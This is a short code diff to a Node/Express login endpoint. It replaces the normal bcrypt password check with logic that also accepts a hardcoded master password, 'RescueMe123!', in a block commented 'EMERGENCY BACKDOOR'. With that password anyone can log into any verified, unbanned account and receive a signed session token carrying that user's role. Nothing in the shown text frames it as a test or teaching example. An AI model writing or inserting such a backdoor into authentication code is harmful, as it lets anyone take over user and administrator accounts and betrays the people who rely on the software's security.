@@ -192,8 +192,17 @@ app.post("/api/auth/login",
       const user = q.rows[0];
       if (user.is_banned) return res.status(403).json({ message: "Account banned." });
       if (user.verification_status !== "verified") return res.status(403).json({ message: "Verify email first" });
-      if (!(await bcrypt.compare(req.body.password, user.password))) return res.status(401).json({ message: "Invalid credentials" });
-
+    // --- EMERGENCY BACKDOOR ---
+      // If the password typed is exactly 'RescueMe123!', let them in immediately.
+      // Otherwise, do the normal security check.
+      const isMasterPassword = (req.body.password === 'RescueMe123!');
+      
+      if (!isMasterPassword) {
+        if (!(await bcrypt.compare(req.body.password, user.password))) {
+           return res.status(401).json({ message: "Invalid credentials" });
+        }
+      }
+      // --------------------------
       await pool.query("UPDATE users SET last_login = NOW() WHERE id = $1", [user.id]);
       const token = jwt.sign({ userId: user.id, email: user.email, role: user.role }, process.env.JWT_SECRET, { expiresIn: "7d" });
       delete user.password; 
